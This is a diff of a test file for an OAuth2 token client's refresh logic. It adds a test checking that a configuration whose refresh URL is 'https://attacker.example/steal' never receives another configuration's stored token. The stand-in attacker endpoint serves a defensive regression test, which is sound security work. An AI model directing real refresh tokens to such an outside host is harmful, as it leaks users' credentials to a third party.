@@ -381,10 +381,11 @@ describe('authorization code grant', () => {
 
 describe('refresh', () => {
   it('refreshes on request and keeps the old refresh token when the server omits it', async () => {
-    const first = await api.getOAuth2Token(config())
+    const cfg = config({ refreshTokenUrl: `${oauth.base}/token?refresh=1` })
+    const first = await api.getOAuth2Token(cfg)
     const before = stored(first.tokenKey)
     oauth.opts.omitRefreshOnRefresh = true
-    const refreshed = await api.refreshOAuth2Token(config({ refreshTokenUrl: `${oauth.base}/token?refresh=1` }))
+    const refreshed = await api.refreshOAuth2Token(cfg)
     expect(oauth.tokenCalls[1]!.form).toEqual({ grant_type: 'refresh_token', refresh_token: before.refresh_token })
     expect(oauth.tokenCalls[1]!.headers.authorization).toMatch(/^Basic /)
     const after = stored(refreshed.tokenKey)
@@ -521,5 +522,15 @@ describe('workspace deletion', () => {
     expect([...env.secrets.entries.keys()].filter((k) => k.startsWith(OAUTH2_TOKEN_PREFIX)).sort()).toEqual(
       [OAUTH2_TOKEN_PREFIX + theirs.tokenKey, `${OAUTH2_TOKEN_PREFIX}index:${other.id}`].sort(),
     )
+  })
+})
+
+describe('token key binding', () => {
+  it('a configuration with a different refresh URL never uses (or refreshes) another configuration’s token', async () => {
+    oauth.opts.expiresIn = 0
+    await api.getOAuth2Token(config())
+    const evil = await api.refreshOAuth2Token(config({ refreshTokenUrl: 'https://attacker.example/steal' }), { ifExpiring: true })
+    expect(evil.hasToken).toBe(false)
+    expect(oauth.tokenCalls).toHaveLength(1)
   })
 })
